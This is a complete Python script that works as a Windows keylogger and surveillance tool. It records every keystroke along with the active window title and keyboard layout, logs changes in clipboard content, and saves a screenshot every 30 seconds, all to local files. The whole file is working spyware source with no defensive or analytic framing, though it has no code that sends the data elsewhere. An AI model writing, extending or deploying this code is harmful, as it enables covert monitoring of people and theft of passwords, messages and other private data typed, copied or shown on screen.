import logging
import threading
import time
from pynput import keyboard
import pyautogui
import os
try:
    import win32api
    import win32gui
except ImportError:
    print("нужно установить pywin32")

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
file_handler = logging.FileHandler('logfile.txt', encoding='utf-8')
formatter = logging.Formatter('[{asctime}]: {message}', style='{', datefmt='%Y-%m-%d %H:%M:%S')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except Exception:
        return "unknown"

def get_keyboard_layout():
    try:
        hwnd = win32gui.GetForegroundWindow()
        thread_id = win32api.GetWindowThreadProcessId(hwnd)[0]
        klid = win32api.GetKeyboardLayout(thread_id)
        lang_id = klid & (2**16 - 1)
        if lang_id == 0x419:
            return "RU"
        elif lang_id == 0x409:
            return "EN"
        else:
            return f"LangID: {hex(lang_id)}"
    except Exception:
        return "unknown"

def on_press(key):
    try:
        vk = getattr(key, 'vk', None)
        sc = getattr(key, 'scan_code', None)
        layout = get_keyboard_layout()
        active_window = get_active_window()
        logger.info(f"{active_window} | Layout: {layout} | VK: {vk} | SC: {sc} | Key: {key}")
    except Exception as e:
        logger.error(f"Error in on_press: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def clipboard_monitor(interval=5):
    import pyperclip
    recent = ""
    while True:
        try:
            current = pyperclip.paste()
        except Exception:
            current = ""
        if current != recent and current.strip():
            recent = current
            logger.info(f"CLIPBOARD_CHANGED: {recent}")
        time.sleep(interval)

def screenshot_monitor(interval=30):
    count = 0
    while True:
        filename = f'screenshots/screenshot_{int(time.time())}_{count}.png'
        try:
            img = pyautogui.screenshot()
            img.save(filename)
            logger.info(f"Screenshot saved: {filename}")
        except Exception as e:
            logger.error(f"Error taking screenshot: {e}")
        count += 1
        time.sleep(interval)


if not os.path.exists('screenshots'):
    os.makedirs('screenshots')

threading.Thread(target=clipboard_monitor, daemon=True).start()
threading.Thread(target=screenshot_monitor, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
